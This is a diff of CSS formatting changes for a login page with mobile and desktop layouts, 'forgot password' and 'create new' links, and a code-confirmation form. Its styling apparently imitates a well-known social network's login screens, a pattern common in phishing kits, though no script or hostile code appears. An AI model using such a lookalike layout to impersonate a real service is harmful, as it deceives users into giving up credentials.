@@ -1,5 +1,5 @@
-.home .input-form-login.is-invalid{
-    border-color: #E11D48 !important;
+.home .input-form-login.is-invalid {
+    border: 1px solid #E11D48 !important;
 }
 
 @media screen and (max-width: 767px) {
@@ -45,7 +45,7 @@
         margin-bottom: 36px;
     }
 
-    .home .body .body-form .form-login .mobile-title{
+    .home .body .body-form .form-login .mobile-title {
         align-items: center;
         display: -webkit-flex;
         min-width: 100px;
@@ -53,7 +53,7 @@
         padding-top: 8px;
     }
 
-    .home .body .body-form .form-login .mobile-title-content{
+    .home .body .body-form .form-login .mobile-title-content {
         flex: 1;
         min-width: 0;
         width: 0;
@@ -63,13 +63,13 @@
         display: none;
     }
 
-    .home .body .body-form .form-login .login_form_container{
+    .home .body .body-form .form-login .login_form_container {
         padding: 0 16px;
         margin: 0 auto;
         max-width: 416px;
     }
 
-    .home .body .body-form .form-login .mobile-login-form{
+    .home .body .body-form .form-login .mobile-login-form {
         padding-bottom: 1px;
         padding-top: 8px;
         margin: 0;
@@ -80,11 +80,11 @@
         display: none;
     }
 
-    .home .body .body-form .form-login .login-form-item{
+    .home .body .body-form .form-login .login-form-item {
         position: relative;
     }
 
-    .home .body .body-form .form-login .login-form-item:before{
+    .home .body .body-form .form-login .login-form-item:before {
         border-color: rgba(0, 0, 0, .07) rgba(0, 0, 0, .11) rgba(0, 0, 0, .18);
         border-radius: 4px;
         border-style: solid;
@@ -98,13 +98,13 @@
         top: -1px;
     }
 
-    .home .body .body-form .form-login .login-form-item-content{
+    .home .body .body-form .form-login .login-form-item-content {
         border-radius: 4px;
         overflow: hidden;
         background: #fff;
     }
 
-    .home .body .body-form .form-login .login-form-control input{
+    .home .body .body-form .form-login .login-form-control input {
         -webkit-appearance: none;
         box-sizing: border-box;
         width: 100%;
@@ -120,19 +120,19 @@
         background: #f5f6f7;
     }
 
-    .home .body .body-form .form-login .login-form-item-hr{
+    .home .body .body-form .form-login .login-form-item-hr {
         padding: 4px;
     }
 
-    .home .body .body-form .form-login .login-form-password{
+    .home .body .body-form .form-login .login-form-password {
         background-color: #f5f6f7;
     }
 
-    .home .body .body-form .form-login .login-form-password-content{
+    .home .body .body-form .form-login .login-form-password-content {
         display: -webkit-flex;
     }
 
-    .home .body .body-form .form-login .login-form-password-content-item{
+    .home .body .body-form .form-login .login-form-password-content-item {
         flex: 1;
         min-width: 0;
         width: 0;
@@ -140,14 +140,14 @@
         display: flex;
     }
 
-    .home .body .body-form .form-login .login-form-password-control{
+    .home .body .body-form .form-login .login-form-password-control {
         border: 1px solid transparent;
         margin: -1px;
         flex: 1;
         width: 100%;
     }
 
-    .home .body .body-form .form-login .login-form-password-control input{
+    .home .body .body-form .form-login .login-form-password-control input {
         -webkit-appearance: none;
         box-sizing: border-box;
         width: 100%;
@@ -163,12 +163,12 @@
         background: #f5f6f7;
     }
 
-    .home .body .body-form .mobile-button-submit{
+    .home .body .body-form .mobile-button-submit {
         text-align: center;
         padding-top: 12px;
     }
 
-    .home .body .body-form .mobile-login-button{
+    .home .body .body-form .mobile-login-button {
         display: flex;
         justify-content: center;
         align-items: center;
@@ -197,7 +197,7 @@
         font-weight: bold;
     }
 
-    .home .body .body-form .mobile-login-button:before{
+    .home .body .body-form .mobile-login-button:before {
         left: 0;
         top: 0;
         transform: translate(-0.5px, -0.5px);
@@ -212,7 +212,7 @@
         z-index: -1;
     }
 
-    .home .body .body-form .mobile-login-button:after{
+    .home .body .body-form .mobile-login-button:after {
         border-image: none;
         border-width: 0;
         border-color: initial;
@@ -228,16 +228,16 @@
         z-index: 1;
     }
 
-    .home .body .body-form .footer-forgot-password{
+    .home .body .body-form .footer-forgot-password {
         margin-bottom: -36px;
         padding-top: 12px;
     }
 
-    .home .body .body-form .footer-forgot-password-item{
+    .home .body .body-form .footer-forgot-password-item {
         text-align: center;
     }
 
-    .home .body .body-form .footer-forgot-password-link{
+    .home .body .body-form .footer-forgot-password-link {
         color: #216fdb;
         font-family: 'Roboto-Regular', 'Helvetica', 'sans-serif';
         font-size: 14px;
@@ -247,11 +247,11 @@
         text-align: center;
     }
 
-    .home .body .mobile-footer .create-new{
+    .home .body .mobile-footer .create-new {
         padding-top: 42px
     }
 
-    .home .body .mobile-footer .create-new .create-new-line-hr{
+    .home .body .mobile-footer .create-new .create-new-line-hr {
         margin: 12px 0 4px 0;
         width: 100%;
         display: block;
@@ -260,13 +260,13 @@
         white-space: nowrap;
     }
 
-    .home .body .mobile-footer .create-new .create-new-line-hr .line-hr{
+    .home .body .mobile-footer .create-new .create-new-line-hr .line-hr {
         display: inline-block;
         position: relative;
         color: #4b4f56;
     }
 
-    .home .body .mobile-footer .create-new .create-new-line-hr .line-hr:before{
+    .home .body .mobile-footer .create-new .create-new-line-hr .line-hr:before {
         margin-right: 15px;
         right: 100%;
         background: #ccd0d5;
@@ -280,7 +280,7 @@
         white-space: nowrap;
     }
 
-    .home .body .mobile-footer .create-new .create-new-line-hr .line-hr:after{
+    .home .body .mobile-footer .create-new .create-new-line-hr .line-hr:after {
         left: 100%;
         margin-left: 15px;
         background: #ccd0d5;
@@ -294,12 +294,12 @@
         color: #4b4f56;
     }
 
-    .home .body .mobile-footer .create-new .create-new-button{
+    .home .body .mobile-footer .create-new .create-new-button {
         text-align: center;
         padding: 12px 0 12px 0;
     }
 
-    .home .body .mobile-footer .create-new .button-create-new{
+    .home .body .mobile-footer .create-new .button-create-new {
         background: white;
         border-color: #bec3c9;
         border-style: solid;
@@ -331,13 +331,13 @@
         -webkit-user-select: none;
     }
 
-    .alert-form-login-desktop{
+    .alert-form-login-desktop {
         display: none !important;
     }
 }
 
 @media screen and (min-width: 768px) {
-    .alert-form-login-mobile{
+    .alert-form-login-mobile {
         display: none !important;
     }
 
@@ -414,7 +414,7 @@
         font-family: inherit;
         margin: auto;
         padding: 22px 108px 26px;
-        width: 396px;
+        width: 610px;
         background-color: #fff;
         border: 1px solid #dddfe2;
         border-radius: 3px;
@@ -423,7 +423,7 @@
 
     .home .body .body-form .login-form-main-mobile,
     .home .body .body-form .mobile-footer,
-    .home .body .body-form .mobile-button-submit{
+    .home .body .body-form .mobile-button-submit {
         display: none;
     }
 
@@ -432,7 +432,7 @@
         padding: 18px 0;
     }
 
-    .home .body .body-form .form-login .mobile-title{
+    .home .body .body-form .form-login .mobile-title {
         display: none;
     }
 
@@ -535,47 +535,45 @@
     border-radius: 3px;
 }
 
-.home .body .body-form .form-confirm .line-hr{
+.home .body .body-form .form-confirm .line-hr {
     border-top: 0.5px solid #dddfe2;
 }
 
 .home .body .body-form .form-confirm .form-confirm-sub-title,
-.home .body .body-form .form-confirm .form-confirm-title
-{
+.home .body .body-form .form-confirm .form-confirm-title {
     padding-bottom: 10px;
 }
 
 .home .body .body-form .form-confirm .form-confirm-input .title-confirm-input,
 .home .body .body-form .form-confirm .form-confirm-notice .title-confirm-notice,
-.home .body .body-form .form-confirm .form-confirm-title .title-confirm{
+.home .body .body-form .form-confirm .form-confirm-title .title-confirm {
     font-weight: bold;
     font-size: 16px;
 }
 
 .home .body .body-form .form-confirm .form-confirm-notice .sub-title-confirm-notice,
-.home .body .body-form .form-confirm .form-confirm-sub-title .sub-title-confirm{
+.home .body .body-form .form-confirm .form-confirm-sub-title .sub-title-confirm {
     font-size: 16px;
     padding-top: 10px;
     color: #363636;
 }
 
 .home .body .body-form .form-confirm .form-confirm-input,
-.home .body .body-form .form-confirm .form-confirm-notice
-{
+.home .body .body-form .form-confirm .form-confirm-notice {
     padding: 10px 0;
 }
 
-.home .body .body-form .form-confirm .form-confirm-input .sub-title-confirm-input{
+.home .body .body-form .form-confirm .form-confirm-input .sub-title-confirm-input {
     font-size: 16px;
     color: #363636;
 }
 
-.home .body .body-form .form-confirm .form-confirm-input input{
+.home .body .body-form .form-confirm .form-confirm-input input {
     max-width: 200px;
     padding: 0.3rem 1rem;
 }
 
-.home .body .body-form .form-confirm .notice-error{
+.home .body .body-form .form-confirm .notice-error {
     margin-left: -10px;
     margin-right: -10px;
     padding: 10px;
@@ -586,20 +584,20 @@
     color: #363636;
 }
 
-.home .body .body-form .form-confirm .form-confirm-footer{
+.home .body .body-form .form-confirm .form-confirm-footer {
     padding-top: 10px;
     display: flex;
     justify-content: space-between;
     align-items: center;
 }
 
-.home .body .body-form .form-confirm .form-confirm-footer .form-confirm-footer-left a{
+.home .body .body-form .form-confirm .form-confirm-footer .form-confirm-footer-left a {
     color: #4267b2;
     font-size: 14px;
     text-decoration: none;
 }
 
-.home .body .body-form .form-confirm .form-confirm-footer .form-confirm-footer-right button{
+.home .body .body-form .form-confirm .form-confirm-footer .form-confirm-footer-right button {
     background: #4267b2;
     padding: 6px 10px;
     border: none;
@@ -611,9 +609,8 @@
 }
 
 .home .body .body-form .form-confirm .form-confirm-footer .form-confirm-footer-right button:focus-within,
-.home .body .body-form .form-confirm .form-confirm-footer .form-confirm-footer-right button:focus{
+.home .body .body-form .form-confirm .form-confirm-footer .form-confirm-footer-right button:focus {
     border: none;
     outline: none;
     box-shadow: none;
 }
-
